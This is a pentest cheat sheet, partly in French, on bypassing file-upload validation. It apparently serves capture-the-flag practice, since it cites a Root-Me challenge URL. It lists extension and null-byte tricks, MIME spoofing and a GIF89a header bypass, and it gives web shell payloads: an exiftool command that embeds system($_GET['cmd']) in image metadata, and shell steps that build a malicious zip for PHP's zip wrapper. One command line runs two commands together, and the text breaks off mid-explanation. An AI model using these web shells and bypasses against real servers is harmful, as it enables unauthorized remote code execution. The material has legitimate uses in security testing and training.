# File Upload


## exemple de base:


<form action="upload.php" method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Upload Image" name="submit">
</form>


## exemple spécifique:

<form method="POST" enctype="multipart/form-data" action="http://challenge01.root-me.org/realiste/ch6/index.php?sl=../adm&adm=1" >
<input type="file" class="file" name="downloads" size="30">
<input type="hidden" name="action" value="upload">
<input type="hidden" name="function" value="downloads">
<input type="submit" class="submit" value="Upload">
</form>

## NULL BYTE:

pour jouer avec les extensions: 
Solution1:  nommer le fichier backdoor.pngA.php puis intercepter avec burp. Dans le code Hexa remplacer le 41 (A) en hexa par 00
Solution2: nommer le fichier backdoor.php%00.png
Remarque: la réussite dépends du code qui tourne coté serveur pour valider le fichier


## MIME TYPE:

lorsqu'on joue avec les extentions verifier que le “content type” correspond
Content-Type: image/png


## PHP getimagesize()

For file uploads which validate image size using php getimagesize(), it may be possible to execute shellcode by inserting it into the Comment attribute of Image properties and saving it as file.jpg.php.
You can do this with gimp or exiftools:

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpgmv file.jpg file.php.jpg

I'm not sure why some tutorials have the php extension first while others have it second. Try both.


## GIF89a; header

GIF89a is a GIF file header. If uploaded content is being scanned, sometimes the check can be fooled by putting this header item at the top of shellcode:

GIF89a;
<?php 
phpinfo(); 
?>

## EXIF

Inserrer du JS dans les metadata

## misc:

• Content-Type —>Change the parameter in the request header using Burp, ZAP etc.
• Put server executable extensions like file.php5, file.shtml, file.asa, file.cert
• Changing letters to capital form file.aSp or file.PHp3
• Using trailing spaces and/or dots at the end of the filename like file.asp… … . . .. .. , file.asp , file.asp.
• Use of semicolon after the forbidden extension and before the permitted extension example: file.asp;.jpg (Only in IIS 6 or prior)
• Upload a file with 2 extensions—> file.php.jpg
• Use of null character—> file.asp%00.jpg
• Create a file with a forbidden extension —> file.asp:.jpg or file.asp::$data
• Combination of the above


## ZIP:


Zip Wrapper
The zip wrapper can prove useful in combination with file uploads. If the website allows uploading arbitrary files, an attacker can upload a malicious zip file and include PHP code. This wrapper isn't enabled by default and can be installed with the command below:
apt install phpX.Y-zip
Follow the steps below to create a malicious archive.
echo '<?php system($_GET['cmd']); ?>' > exec.php
zip malicious.zip exec.php
rm exec.php
Next, copy malicious.zip to the webroot to simulate the upload. The files in the zip archive can be referenced using the # symbol, which should be URL-encoded in the request. For example, the URL below can be used to include exec.php and then execute code using the cmd parameter.
   






